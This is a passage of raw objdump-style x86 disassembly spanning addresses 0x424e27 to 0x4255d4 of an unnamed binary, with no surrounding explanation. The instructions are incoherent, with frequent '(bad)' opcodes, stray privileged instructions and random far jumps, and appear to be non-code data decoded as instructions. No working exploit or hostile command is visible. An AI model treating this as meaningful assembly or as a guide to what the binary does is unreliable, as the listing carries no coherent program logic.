  424e27:	dec    eax
  424e28:	mov    ah,0xb1
  424e2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424e2b:	retf   
  424e2c:	mov    cl,0xd
  424e2e:	xchg   esp,eax
  424e2f:	(bad)  
  424e30:	in     eax,0x85
  424e32:	xchg   esp,eax
  424e33:	push   ds
  424e34:	or     esp,edi
  424e36:	mov    BYTE PTR [ebx*4+0x591e65db],dh
  424e3d:	in     al,dx
  424e3e:	jge    0x424e87
  424e40:	sbb    edx,DWORD PTR [ebp+0x30]
  424e43:	out    0xf0,eax
  424e45:	mov    esp,0x9d9afa7d
  424e4a:	sub    eax,0x19a15f57
  424e4f:	xchg   DWORD PTR [ecx-0x2e452d98],ebx
  424e55:	dec    esi
  424e56:	inc    esp
  424e57:	mov    esi,0x436b349f
  424e5c:	mov    bh,0x84
  424e5e:	jle    0x424e40
  424e60:	pop    edx
  424e61:	add    al,0xc8
  424e63:	cmc    
  424e64:	dec    eax
  424e65:	fimul  DWORD PTR [edx+eiz*2]
  424e68:	(bad)  
  424e6a:	leave  
  424e6b:	out    dx,al
  424e6c:	retf   0x7edb
  424e6f:	xchg   esp,eax
  424e70:	jmp    0xe7ed:0x2f90c80b
  424e77:	jl     0x424eb1
  424e79:	sbb    al,0xc4
  424e7b:	icebp  
  424e7c:	xor    dh,BYTE PTR ds:0xf3f80865
  424e82:	sub    al,0xa0
  424e84:	push   ds
  424e85:	xchg   ebx,eax
  424e86:	push   ds
  424e87:	mov    ch,0x3e
  424e89:	(bad)  
  424e8a:	and    eax,DWORD PTR [ebx+0x26e2d70a]
  424e90:	and    al,0xf1
  424e92:	shl    ebx,cl
  424e94:	lds    esi,FWORD PTR [eax]
  424e96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424e97:	ja     0x424edf
  424e99:	aad    0xd3
  424e9b:	test   BYTE PTR [edx-0x717d58fd],ah
  424ea1:	xchg   ebp,eax
  424ea2:	pushf  
  424ea3:	xchg   edi,eax
  424ea4:	(bad)  
  424ea5:	test   al,0xfd
  424ea7:	cs inc edi
  424ea9:	sbb    ecx,DWORD PTR [ecx]
  424eab:	sbb    esi,DWORD PTR [edx+0x6f]
  424eae:	sbb    eax,0x97b0ad5a
  424eb3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424eb4:	and    eax,0x8666e470
  424eba:	inc    edx
  424ebb:	sbb    BYTE PTR [ebp-0x23],dh
  424ebe:	inc    ebx
  424ebf:	add    esi,DWORD PTR [eax+0x1d]
  424ec2:	js     0x424e65
  424ec4:	dec    esp
  424ec5:	add    eax,0x7b5e475c
  424eca:	mov    ebp,0xf0e9f34e
  424ecf:	push   esi
  424ed0:	push   ds
  424ed1:	pop    ebx
  424ed2:	stc    
  424ed3:	mov    ebx,0xc00f6716
  424ed8:	fwait
  424ed9:	into   
  424eda:	push   esp
  424edb:	sub    dl,BYTE PTR [eax]
  424edd:	imul   ebp,DWORD PTR [edx+0x5d6adcfe],0x68345c86
  424ee7:	ins    BYTE PTR es:[edi],dx
  424ee8:	popf   
  424ee9:	lds    ebx,FWORD PTR [ecx*1+0x25c6127a]
  424ef0:	push   edi
  424ef1:	test   DWORD PTR [edi-0x5944d3f9],edx
  424ef7:	push   esp
  424ef8:	into   
  424ef9:	and    al,0x12
  424efb:	call   FWORD PTR [ebx-0x4f]
  424efe:	neg    BYTE PTR [edx-0x27]
  424f01:	mov    al,0xcb
  424f03:	mov    ebx,ecx
  424f05:	adc    eax,0x260ee802
  424f0a:	inc    eax
  424f0b:	test   eax,0xacab6526
  424f10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424f11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424f12:	xchg   ebp,eax
  424f13:	xchg   DWORD PTR [edx-0x3],edi
  424f16:	add    al,0x11
  424f18:	lock addr16 pop es
  424f1b:	sbb    al,0x92
  424f1d:	lods   al,BYTE PTR ds:[esi]
  424f1e:	punpckhwd mm6,QWORD PTR [ecx]
  424f21:	inc    ebp
  424f22:	mov    al,0x76
  424f24:	dec    edx
  424f25:	scas   al,BYTE PTR es:[edi]
  424f26:	dec    ebp
  424f27:	loop   0x424f2a
  424f29:	(bad)  
  424f2a:	mov    cs,ecx
  424f2c:	xchg   esi,eax
  424f2d:	push   0xffffffe7
  424f2f:	daa    
  424f30:	fild   DWORD PTR [edi+0x2]
  424f33:	sub    ecx,edx
  424f35:	outs   dx,DWORD PTR ds:[esi]
  424f36:	push   edi
  424f37:	hlt    
  424f38:	ja     0x424f1d
  424f3a:	push   esi
  424f3b:	cmp    al,0x55
  424f3d:	and    bl,ah
  424f3f:	add    bh,BYTE PTR [ebx+0x4ddef4ab]
  424f45:	fldcw  WORD PTR [edi-0x4b]
  424f48:	fstp   DWORD PTR [edx-0x6766273e]
  424f4e:	add    DWORD PTR [ecx-0x7d8e16c0],edx
  424f54:	jo     0x424f02
  424f56:	adc    eax,0x31f036c0
  424f5b:	iret   
  424f5c:	fld    QWORD PTR [esi+ebx*4+0x2a]
  424f60:	iretw  
  424f62:	sub    al,0xb8
  424f64:	push   ss
  424f65:	jle    0x424efd
  424f67:	inc    ebx
  424f68:	imul   esi,DWORD PTR [ecx-0x65be3fe1],0x32
  424f6f:	inc    ebx
  424f70:	jo     0x424f97
  424f72:	icebp  
  424f73:	cmp    eax,DWORD PTR [ecx+0x5e]
  424f76:	or     DWORD PTR [edi-0x14c5efcf],esp
  424f7c:	adc    BYTE PTR [ebp-0x668933f5],dl
  424f82:	xor    bh,BYTE PTR ds:0xd07926e9
  424f88:	or     dl,bl
  424f8a:	stos   DWORD PTR es:[edi],eax
  424f8b:	(bad)  
  424f8c:	test   eax,0xdad11faf
  424f91:	pop    ss
  424f92:	push   ecx
  424f93:	xchg   ecx,eax
  424f94:	and    al,0xce
  424f96:	std    
  424f97:	outs   dx,DWORD PTR ds:[esi]
  424f98:	mov    ds:0xd7bc3c9e,al
  424f9d:	int3   
  424f9e:	call   esp
  424fa0:	aaa    
  424fa1:	cs btr esi,eax
  424fa5:	sbb    dh,BYTE PTR [esi-0x20]
  424fa8:	in     eax,dx
  424fa9:	aad    0xd9
  424fab:	call   0x5324:0x4f202470
  424fb2:	dec    edx
  424fb3:	push   es
  424fb4:	sti    
  424fb5:	ins    BYTE PTR es:[edi],dx
  424fb6:	fdiv   QWORD PTR [edi]
  424fb8:	sub    DWORD PTR [edi],ebp
  424fba:	jne    0x424fec
  424fbc:	sub    DWORD PTR [edx-0x4b],edi
  424fbf:	or     DWORD PTR [esp+edi*4-0x26b642b5],ecx
  424fc6:	sub    al,0x4e
  424fc8:	or     BYTE PTR [ebx+edi*4+0x12],bl
  424fcc:	fcmovb st,st(7)
  424fce:	mov    dl,0x6e
  424fd0:	lahf   
  424fd1:	or     BYTE PTR [edx+0x3b],ah
  424fd4:	das    
  424fd5:	mov    esp,0x69241349
  424fda:	sub    esi,eax
  424fdc:	ins    BYTE PTR es:[edi],dx
  424fdd:	ret    
  424fde:	scas   al,BYTE PTR es:[edi]
  424fdf:	sbb    BYTE PTR [ecx+edi*4-0x53],0x23
  424fe4:	fimul  DWORD PTR [edx+0x1bcf2650]
  424fea:	lds    eax,FWORD PTR fs:[ecx+ebp*2+0x27]
  424fef:	adc    al,0x11
  424ff1:	retf   0xfb09
  424ff4:	mov    fs,WORD PTR [esi-0x73]
  424ff7:	idiv   BYTE PTR [ebp-0x23]
  424ffa:	jnp    0x42504d
  424ffc:	or     ebx,edx
  424ffe:	cmp    bh,BYTE PTR [eax-0x53a7b5b5]
  425004:	push   0xffffff98
  425006:	pop    ebp
  425007:	adc    dh,ah
  425009:	fisubr DWORD PTR [edi+esi*1+0x21c1f817]
  425010:	and    ah,BYTE PTR [ebx]
  425012:	sub    ecx,DWORD PTR [edx-0x127bac9b]
  425018:	fld    DWORD PTR [eax]
  42501a:	add    BYTE PTR [eax],al
  42501c:	dec    edx
  42501d:	xchg   DWORD PTR [edx+0x4c],edx
  425020:	(bad)  
  425022:	pop    esi
  425023:	xchg   eax,esp
  425025:	js     0x424fa8
  425027:	mov    ebx,0x41a3dbe5
  42502c:	inc    ebp
  42502d:	leave  
  42502e:	add    DWORD PTR [eax],eax
  425030:	test   DWORD PTR [edx],eax
  425032:	add    BYTE PTR [eax],al
  425034:	mov    gs,WORD PTR [ecx+edx*4+0x6b]
  425038:	cmp    BYTE PTR [edx-0x439c510e],0x84
  42503f:	or     bh,bh
  425041:	jo     0x4250c0
  425043:	imul   ebp,DWORD PTR [ebx-0x65],0x40
  425047:	mov    edx,0x5b5c4ba7
  42504c:	xor    ebx,DWORD PTR [ebp+0x36b8aaa0]
  425052:	pushf  
  425053:	icebp  
  425054:	jno    0x42507a
  425056:	js     0x42501e
  425058:	pusha  
  425059:	push   0xc8db167e
  42505e:	cmp    eax,0x16251dfe
  425063:	stc    
  425064:	shr    ebx,cl
  425066:	rcl    BYTE PTR [esi+ebx*4-0x7e],0xa9
  42506b:	xlat   BYTE PTR ds:[ebx]
  42506c:	in     eax,dx
  42506d:	jl     0x4250a6
  42506f:	inc    edi
  425070:	mov    bh,0x84
  425072:	clc    
  425073:	fld    DWORD PTR [ebx+0x2b85d699]
  425079:	out    dx,eax
  42507a:	sub    al,0x66
  42507c:	inc    ebp
  42507d:	pop    es
  42507e:	lods   eax,DWORD PTR ds:[esi]
  42507f:	jo     0x4250d3
  425081:	mov    ebp,0x6ddf8bb7
  425086:	dec    eax
  425087:	mov    dh,0x9
  425089:	(bad)  
  42508a:	ror    DWORD PTR [edx],0x5d
  42508d:	idiv   DWORD PTR [edx]
  42508f:	xchg   esp,eax
  425090:	std    
  425091:	sbb    ch,BYTE PTR [edx]
  425093:	mov    al,0x7
  425095:	int3   
  425096:	ror    BYTE PTR [eax-0x32eec47b],0x1c
  42509d:	call   0xc9bb:0xba959078
  4250a4:	arpl   WORD PTR [edx-0x54],ax
  4250a7:	test   al,0xdb
  4250a9:	jmp    0x425120
  4250ab:	in     eax,dx
  4250ac:	pop    es
  4250ad:	out    0x3d,eax
  4250af:	jge    0x4250f3
  4250b1:	mov    dh,0x38
  4250b3:	dec    edi
  4250b4:	pop    esi
  4250b5:	dec    eax
  4250b6:	pop    es
  4250b7:	adc    eax,0x10120b15
  4250bc:	xchg   DWORD PTR [edi],esi
  4250be:	cmp    eax,0x21711fbc
  4250c3:	pop    es
  4250c4:	adc    esi,ecx
  4250c6:	sbb    al,0xad
  4250c8:	xor    al,0x17
  4250ca:	mov    bl,0xee
  4250cc:	jb     0x425100
  4250ce:	dec    ebx
  4250cf:	add    eax,0x6551eb32
  4250d4:	sbb    edi,edi
  4250d6:	xchg   DWORD PTR [ecx],edi
  4250d8:	leave  
  4250d9:	add    eax,ebp
  4250db:	mov    bh,0x66
  4250dd:	mov    ebp,0x48237338
  4250e2:	add    ebx,edi
  4250e4:	xchg   edx,eax
  4250e5:	icebp  
  4250e6:	push   eax
  4250e7:	ja     0x4250db
  4250e9:	cld    
  4250ea:	into   
  4250eb:	pop    esp
  4250ec:	jg     0x425080
  4250ee:	cmp    dl,BYTE PTR [ecx+0x15256208]
  4250f4:	or     eax,DWORD PTR [ecx+0x3a]
  4250f7:	dec    ebp
  4250f8:	leave  
  4250f9:	sub    al,0xbe
  4250fb:	mov    DWORD PTR [esi],ebp
  4250fd:	add    DWORD PTR [ebx-0x24],0xffffffcc
  425101:	mov    ds:0xdf152ba0,al
  425106:	mov    bl,0x76
  425108:	cmp    eax,0x1df98461
  42510d:	pop    esi
  42510e:	int3   
  42510f:	ss in  eax,0x6e
  425112:	sbb    ecx,DWORD PTR [ebx+edx*4-0x52903c94]
  425119:	mov    esp,0x2843714e
  42511e:	add    esi,esi
  425120:	popf   
  425121:	daa    
  425122:	sbb    DWORD PTR [esi+ebx*4-0x1b14a397],edx
  425129:	ret    
  42512a:	inc    esi
  42512b:	jno    0x4251a3
  42512d:	add    DWORD PTR [edi+0xa],esi
  425130:	sti    
  425131:	push   ds
  425132:	and    dl,BYTE PTR [bp+0x56]
  425136:	ja     0x4250d6
  425138:	pop    ds
  425139:	and    DWORD PTR [eax],0xffffff84
  42513c:	(bad)  
  42513d:	loop   0x4251ab
  42513f:	pushf  
  425140:	(bad)  [ebx]
  425142:	mov    al,0x4b
  425144:	sbb    BYTE PTR [esi+ecx*2+0x2f],0x82
  425149:	or     esi,DWORD PTR [esp+ebp*1-0x27]
  42514d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42514e:	ja     0x4250f8
  425150:	xchg   ebp,eax
  425151:	and    esi,DWORD PTR [ebx-0x45a7d052]
  425157:	sub    al,0xb2
  425159:	fmul   QWORD PTR [ebx-0x6f85bb4b]
  42515f:	sub    BYTE PTR [edx],ch
  425161:	fwait
  425162:	add    cl,BYTE PTR [ebx-0x62457242]
  425168:	jl     0x4251b9
  42516a:	ja     0x425147
  42516c:	or     DWORD PTR [edi-0x58],ebx
  42516f:	dec    ebx
  425170:	daa    
  425171:	inc    ecx
  425172:	pop    edi
  425173:	popf   
  425174:	push   ebp
  425175:	sub    al,0xad
  425177:	push   esi
  425178:	cld    
  425179:	shl    DWORD PTR [ebx],1
  42517b:	in     al,dx
  42517c:	jp     0x425178
  42517e:	sbb    edi,0x28
  425181:	cwde   
  425182:	push   ecx
  425183:	mov    ebp,0x3fed61cf
  425188:	setae  BYTE PTR [ecx]
  42518b:	mov    cl,0x46
  42518d:	push   ebp
  42518e:	sub    DWORD PTR [ebp-0xe],eax
  425191:	cmp    eax,DWORD PTR [ebp-0x280e0689]
  425197:	call   0x32fe5bf4
  42519c:	cmp    edi,DWORD PTR ds:[ebp-0x1c7cfda0]
  4251a3:	clc    
  4251a4:	mov    dl,0xbf
  4251a6:	out    dx,al
  4251a7:	pusha  
  4251a8:	sbb    al,0x9c
  4251aa:	iret   
  4251ab:	test   ebx,edi
  4251ad:	pop    ds
  4251ae:	fs ret 0xa51e
  4251b2:	jno    0x425208
  4251b4:	mov    ch,0xf9
  4251b6:	sahf   
  4251b7:	lahf   
  4251b8:	int3   
  4251b9:	sub    al,0xea
  4251bb:	leave  
  4251bc:	or     dh,BYTE PTR [esi+0x3b07d96a]
  4251c2:	std    
  4251c3:	and    dh,BYTE PTR [edi+0x48]
  4251c6:	jmp    0x2feb7add
  4251cb:	pop    esi
  4251cc:	sub    esp,DWORD PTR [esi+eax*1]
  4251cf:	repz mov al,ss:0xa474a674
  4251d6:	push   ebx
  4251d7:	pop    esi
  4251d8:	mov    bh,0x3c
  4251da:	ret    0x5aa7
  4251dd:	pop    ecx
  4251de:	xchg   esp,eax
  4251df:	xchg   ebp,eax
  4251e0:	(bad)  [edi-0x8]
  4251e3:	cmp    bl,bh
  4251e5:	mov    al,ds:0x794443dd
  4251ea:	or     DWORD PTR [ebp+0x35cea4b8],eax
  4251f0:	mov    eax,ds:0xc4c4140a
  4251f5:	leave  
  4251f6:	push   esp
  4251f7:	or     edi,edi
  4251f9:	pushf  
  4251fa:	sbb    ebp,ebp
  4251fc:	push   ebx
  4251fd:	pop    ebp
  4251fe:	xchg   edx,eax
  4251ff:	inc    edx
  425200:	mov    esp,0xcd74d9d3
  425205:	mov    al,0x3a
  425207:	loop   0x42524e
  425209:	into   
  42520a:	add    cl,BYTE PTR [ebx+0x59]
  42520d:	mov    ebx,0x906c4691
  425212:	pop    ss
  425213:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425214:	je     0x4251fb
  425216:	sbb    ebx,DWORD PTR [eax+0x52]
  425219:	aad    0xf0
  42521b:	mov    al,0x23
  42521d:	lock and eax,edi
  425220:	je     0x4251b5
  425222:	aam    0xba
  425224:	sub    BYTE PTR [edx+0x59],cl
  425227:	and    ebp,DWORD PTR [eax-0x69bcdf83]
  42522d:	and    DWORD PTR [edx],esp
  42522f:	xor    BYTE PTR [edx+edx*4+0x2876a53b],0x92
  425237:	adc    esp,esp
  425239:	(bad)  
  42523a:	test   eax,0x6d4eafba
  42523f:	mov    ebx,0xc69552b0
  425244:	std    
  425245:	lea    esp,[esi-0x5b]
  425248:	dec    eax
  425249:	mov    ecx,0xaab67c39
  42524e:	mov    ds:0xdc126d4c,eax
  425253:	mov    esi,0x542fe57e
  425258:	push   DWORD PTR [ecx+0x4b]
  42525b:	mov    dl,0x40
  42525d:	xchg   ebx,eax
  42525e:	add    eax,0x6480610e
  425263:	or     al,0x36
  425265:	es int3 
  425267:	jns    0x425226
  425269:	aad    0xba
  42526b:	in     eax,0x13
  42526d:	xchg   ebx,eax
  42526e:	ret    
  42526f:	and    DWORD PTR [edx-0x28],ebp
  425272:	in     eax,dx
  425273:	(bad)  
  425274:	in     al,dx
  425275:	cmp    DWORD PTR [edx+0x52],0xffffffc4
  425279:	ret    
  42527a:	inc    eax
  42527b:	repnz pop edi
  42527d:	jnp    0x425220
  42527f:	loopne 0x4252d7
  425281:	xchg   esi,eax
  425282:	pop    esp
  425283:	loope  0x425250
  425285:	cs inc esp
  425287:	push   cs
  425288:	push   edi
  425289:	pop    edi
  42528a:	cld    
  42528b:	popf   
  42528c:	ss je  0x4252ce
  42528f:	shr    ah,0x52
  425292:	ja     0x425245
  425294:	fld    st(4)
  425296:	mov    eax,es:0xf93ebb5
  42529c:	and    bh,cl
  42529e:	stos   DWORD PTR es:[edi],eax
  42529f:	xor    al,0x78
  4252a1:	dec    di
  4252a3:	mov    ds:0x6aa2958d,eax
  4252a8:	ins    BYTE PTR es:[edi],dx
  4252a9:	bound  esi,QWORD PTR [edx-0x31]
  4252ac:	mov    BYTE PTR ds:0xb2402c90,ch
  4252b2:	pop    esp
  4252b3:	sbb    bh,BYTE PTR [edi]
  4252b5:	mov    edi,0xea43b
  4252ba:	add    BYTE PTR [eax],al
  4252bc:	or     dl,BYTE PTR [edx-0x3c684]
  4252c2:	dec    edi
  4252c3:	mov    bl,0xec
  4252c5:	jo     0x42527e
  4252c7:	lea    ecx,[edi-0x35e93b3e]
  4252cd:	retf   
  4252ce:	add    DWORD PTR [eax],eax
  4252d0:	test   DWORD PTR [edx],eax
  4252d2:	add    BYTE PTR [eax],al
  4252d4:	or     DWORD PTR ds:0x61e4ac98,0x66
  4252db:	imul   esp,DWORD PTR [esi],0xcf5d2a9f
  4252e1:	cli    
  4252e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4252e3:	cli    
  4252e4:	sub    al,0x61
  4252e6:	adc    DWORD PTR [ebx],edx
  4252e8:	push   ecx
  4252e9:	iret   
  4252ea:	ficom  WORD PTR [ebx]
  4252ec:	xchg   esi,eax
  4252ed:	or     eax,0x8fb818a8
  4252f2:	aam    0xbe
  4252f4:	mov    cl,bl
  4252f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4252f7:	or     DWORD PTR [ebp+0x2f],ebx
  4252fa:	loop   0x425319
  4252fc:	push   edi
  4252fd:	outs   dx,DWORD PTR ds:[esi]
  4252fe:	pop    edx
  4252ff:	in     al,0x90
  425301:	add    eax,0x797766cb
  425306:	mov    cs,WORD PTR [esi-0x26781cb1]
  42530c:	push   esp
  42530d:	lahf   
  42530e:	int3   
  42530f:	ret    0xce38
  425312:	repnz inc eax
  425314:	sbb    DWORD PTR [ecx-0x4cdca030],ebx
  42531a:	or     esi,DWORD PTR [eax+0x6ede1287]
  425320:	xor    dl,BYTE PTR [ebx-0x1336a32d]
  425326:	mov    ebp,0x1b62e198
  42532b:	or     esi,ebx
  42532d:	or     al,0x84
  42532f:	mov    edi,0x5bd24c17
  425334:	into   
  425335:	in     eax,dx
  425336:	xchg   esp,eax
  425337:	jbe    0x425355
  425339:	gs cmp ebx,eax
  42533c:	aam    0x4d
  42533e:	add    eax,0x40df7973
  425343:	add    bh,BYTE PTR [eax+0x76a01e6]
  425349:	xchg   edi,eax
  42534a:	imul   ecx,DWORD PTR [edx+0x1f],0xffffffe5
  42534e:	ret    
  42534f:	fcomp  DWORD PTR [ecx-0x6f]
  425352:	sub    al,0x2e
  425354:	xchg   edx,eax
  425355:	mov    BYTE PTR [ecx+0x2c],0x93
  425359:	mov    bl,0x57
  42535b:	repnz mov cl,0x38
  42535e:	loope  0x425311
  425360:	mov    bl,0x40
  425362:	aaa    
  425363:	sub    edx,ebp
  425365:	das    
  425366:	fimul  DWORD PTR [eax-0x6ee8fca9]
  42536c:	sbb    cl,BYTE PTR [esi+ebx*1-0xe]
  425370:	jo     0x42538b
  425372:	fimul  WORD PTR [edi+ebx*2+0x62]
  425376:	nop
  425377:	inc    DWORD PTR [esi+0x27]
  42537a:	mov    bl,0x27
  42537c:	pop    ecx
  42537d:	inc    esp
  42537e:	out    0xe0,eax
  425380:	dec    esi
  425381:	mov    ebx,0xb4596822
  425386:	aam    0xf0
  425388:	fsub   DWORD PTR [eax-0x64031f2a]
  42538e:	sti    
  42538f:	push   ebx
  425390:	es sti 
  425392:	sbb    al,0x60
  425394:	pop    esp
  425395:	mov    al,0x87
  425397:	and    al,0x2
  425399:	jae    0x4253d5
  42539b:	inc    ecx
  42539c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42539d:	inc    esp
  42539e:	cmp    esi,DWORD PTR [ebx-0x2d633b34]
  4253a4:	jne    0x4253c9
  4253a6:	test   BYTE PTR [esi],ah
  4253a8:	rcl    ah,cl
  4253aa:	push   0x724937b4
  4253af:	and    ch,BYTE PTR [ecx-0x78]
  4253b2:	stc    
  4253b3:	fdecstp 
  4253b5:	ja     0x4253e9
  4253b7:	lods   eax,DWORD PTR ds:[esi]
  4253b8:	and    DWORD PTR [ebp+0x3b5e4b9e],ebp
  4253be:	cmp    eax,0x9f18f291
  4253c3:	clc    
  4253c4:	addr16 clc 
  4253c6:	adc    bl,ah
  4253c8:	mov    eax,gs
  4253ca:	int    0x8a
  4253cc:	and    al,0x86
  4253ce:	or     DWORD PTR [edx],edi
  4253d0:	js     0x42540b
  4253d2:	fdivr  QWORD PTR [esi+0x48]
  4253d5:	test   al,0x4e
  4253d7:	pop    ss
  4253d8:	loop   0x4253a9
  4253da:	cmc    
  4253db:	std    
  4253dc:	mov    bh,0x76
  4253de:	inc    edi
  4253df:	ins    BYTE PTR es:[edi],dx
  4253e0:	push   esi
  4253e1:	push   ss
  4253e2:	jae    0x42539d
  4253e4:	inc    eax
  4253e5:	and    ecx,DWORD PTR [ebx-0x7c0a9147]
  4253eb:	push   ss
  4253ec:	sti    
  4253ed:	mov    dh,ch
  4253ef:	adc    DWORD PTR [edx+0x3],0x81110f31
  4253f6:	fisubr DWORD PTR [esi+ebx*2-0x50]
  4253fa:	in     al,dx
  4253fb:	call   0x4d35:0x766ca764
  425402:	pop    es
  425403:	lock sub BYTE PTR [eax+0x42],0x8a
  425408:	cmp    al,0xba
  42540a:	cmc    
  42540b:	mov    es,WORD PTR [esi+0x2791d7e1]
  425411:	mov    ch,0xd6
  425413:	xor    bl,dh
  425415:	xchg   ebp,eax
  425416:	ss dec ecx
  425418:	mov    bl,0x4f
  42541a:	stos   DWORD PTR es:[edi],eax
  42541b:	imul   ebp,DWORD PTR [edx],0x71b4dd3c
  425421:	mov    ds:0x20e6814b,eax
  425426:	push   ebp
  425427:	push   esi
  425428:	add    BYTE PTR [eax],bh
  42542a:	dec    esi
  42542b:	dec    ecx
  42542c:	or     eax,0xf615e3dd
  425431:	mov    al,ds:0xf987e64a
  425436:	mov    ebp,0x6e654107
  42543b:	push   0xffffffb2
  42543d:	js     0x425480
  42543f:	test   eax,0x2356630f
  425444:	fimul  DWORD PTR [edi-0x5d]
  425447:	xor    DWORD PTR [esi-0x6a6fd07c],0xffffffb6
  42544e:	jg     0x4253ff
  425450:	mov    DWORD PTR cs:[eax-0xf],0xbb10a6ab
  425458:	dec    esp
  425459:	repnz dec eax
  42545b:	pusha  
  42545c:	or     eax,0x8e25574c
  425461:	rcl    DWORD PTR [edx-0x4f],cl
  425464:	(bad)  
  425465:	jno    0x42544c
  425467:	inc    esi
  425468:	mov    bl,0x80
  42546a:	rcr    DWORD PTR [ebx+0x1c],cl
  42546d:	or     eax,0x88f970a4
  425472:	sbb    BYTE PTR [esi-0x2a],ah
  425475:	mov    WORD PTR [ebp-0x689b305f],ss
  42547b:	imul   ebx,DWORD PTR [ebp-0x65],0x46fce75d
  425482:	mov    dl,BYTE PTR [ebx+0x13e744de]
  425488:	mov    eax,0x80ae7a8f
  42548d:	bound  edi,QWORD PTR fs:[ebp-0x5c604788]
  425494:	sub    al,0x6
  425496:	cmp    DWORD PTR [ebp+0x41],0x20
  42549a:	mov    esi,esi
  42549c:	jge    0x4254a9
  42549e:	inc    ebx
  42549f:	add    al,BYTE PTR [edi]
  4254a1:	sub    BYTE PTR [esi+ebx*8-0x50],0xe7
  4254a6:	jbe    0x425518
  4254a8:	adc    al,0x55
  4254aa:	std    
  4254ab:	xchg   esp,eax
  4254ac:	ss push ds
  4254ae:	xchg   ecx,eax
  4254af:	in     al,dx
  4254b0:	pop    ecx
  4254b1:	inc    ebx
  4254b2:	lea    eax,[edx-0x7122725d]
  4254b8:	(bad)  
  4254b9:	dec    BYTE PTR [eax+ebx*2]
  4254bc:	xchg   ecx,eax
  4254bd:	dec    edi
  4254be:	add    al,0xc3
  4254c0:	and    al,0x19
  4254c2:	loope  0x4254ee
  4254c4:	push   es
  4254c5:	xlat   BYTE PTR ds:[ebx]
  4254c6:	xor    al,0x41
  4254c8:	call   0x3e196687
  4254cd:	mov    edx,0xe28f52d4
  4254d2:	mov    bl,0x2a
  4254d4:	ins    BYTE PTR es:[edi],dx
  4254d5:	mov    bh,0x20
  4254d7:	dec    ecx
  4254d8:	push   esi
  4254d9:	mov    eax,ds:0xf4e51dae
  4254de:	fucomi st,st(4)
  4254e0:	lock in eax,0x11
  4254e3:	lods   eax,DWORD PTR ds:[esi]
  4254e4:	cs jle 0x4254b7
  4254e7:	jle    0x4254ed
  4254e9:	fimul  WORD PTR [edi-0x58]
  4254ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4254ed:	add    BYTE PTR [ebx-0xe],bh
  4254f0:	gs aam 0xed
  4254f3:	add    ecx,DWORD PTR [esi+edx*2-0x6c811cbe]
  4254fa:	or     eax,0xd941cd74
  4254ff:	in     al,dx
  425500:	scas   al,BYTE PTR es:[edi]
  425501:	push   ss
  425502:	std    
  425503:	jae    0x42552e
  425505:	inc    edx
  425506:	jmp    0x425551
  425508:	not    BYTE PTR [edi+0x4d]
  42550b:	inc    ebp
  42550c:	mov    al,ds:0x8b554fae
  425511:	jmp    0x4254ab
  425513:	and    DWORD PTR [eax+0x772c61d],0xa748392e
  42551d:	sbb    DWORD PTR gs:[ecx+0x4c],edi
  425521:	js     0x425581
  425523:	popf   
  425524:	sub    DWORD PTR [ebx+eax*4-0x26],eax
  425528:	sbb    al,0xbd
  42552a:	shr    DWORD PTR [ecx-0x42],cl
  42552d:	push   es
  42552e:	xchg   ecx,eax
  42552f:	das    
  425530:	sbb    BYTE PTR [ecx-0x3ae9164a],ch
  425536:	jbe    0x4255a3
  425538:	add    eax,DWORD PTR [eax+eiz*4-0x5190b08b]
  42553f:	fisttp WORD PTR [ebp+0x7e]
  425542:	adc    al,0x22
  425544:	adc    esi,esi
  425546:	repnz mov edi,0x8654b01e
  42554c:	cmp    al,0xee
  42554e:	push   ebx
  42554f:	sahf   
  425550:	lods   eax,DWORD PTR ds:[esi]
  425551:	add    edi,DWORD PTR [eax-0x55393fe7]
  425557:	scas   eax,DWORD PTR es:[edi]
  425558:	scas   eax,DWORD PTR es:[edi]
  425559:	add    BYTE PTR [eax],al
  42555b:	add    bl,al
  42555d:	and    ecx,edx
  42555f:	dec    eax
  425560:	repz clc 
  425562:	fld    TBYTE PTR [ebx+0x202892a0]
  425568:	dec    edi
  425569:	aam    0x7e
  42556b:	push   0x4f
  42556d:	into   
  42556e:	add    DWORD PTR [eax],eax
  425570:	test   DWORD PTR [edx],eax
  425572:	add    BYTE PTR [eax],al
  425574:	push   ebx
  425575:	outs   dx,DWORD PTR ds:[esi]
  425576:	cli    
  425577:	pusha  
  425578:	and    bx,WORD PTR [esi-0x56]
  42557c:	das    
  42557d:	js     0x42557d
  42557f:	rcr    DWORD PTR [ebp-0x2393121f],0x7b
  425586:	or     al,0x26
  425588:	mov    BYTE PTR [ecx+0x46],dh
  42558b:	pop    ss
  42558c:	jno    0x4255a5
  42558e:	jo     0x425536
  425590:	sbb    al,0xa7
  425592:	pop    ebp
  425593:	cmp    al,0xab
  425595:	mov    dh,0xb2
  425597:	in     eax,dx
  425598:	xchg   ebx,eax
  425599:	jno    0x42559c
  42559b:	sbb    al,0x2b
  42559d:	jg     0x425589
  42559f:	daa    
  4255a0:	mov    DWORD PTR [edi-0x2f],ebx
  4255a3:	pop    edx
  4255a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4255a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4255a6:	test   al,0x1c
  4255a8:	inc    edi
  4255a9:	aas    
  4255aa:	aad    0xe5
  4255ac:	pop    ecx
  4255ad:	fbstp  TBYTE PTR [esi+ebp*4]
  4255b0:	mov    ?,WORD PTR [eax+0x1f6aed68]
  4255b6:	imul   ecx,esi,0xe3501ab0
  4255bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4255bd:	mov    edx,0x308e44d1
  4255c2:	(bad)  
  4255c3:	mov    eax,0x41b404a0
  4255c8:	pop    ebp
  4255c9:	iret   
  4255ca:	inc    ebx
  4255cb:	add    al,0xd4
  4255cd:	out    0xf7,al
  4255cf:	jns    0x425616
  4255d1:	pop    ds
  4255d2:	push   esp
  4255d3:	icebp  
  4255d4:	xchg   esi,eax
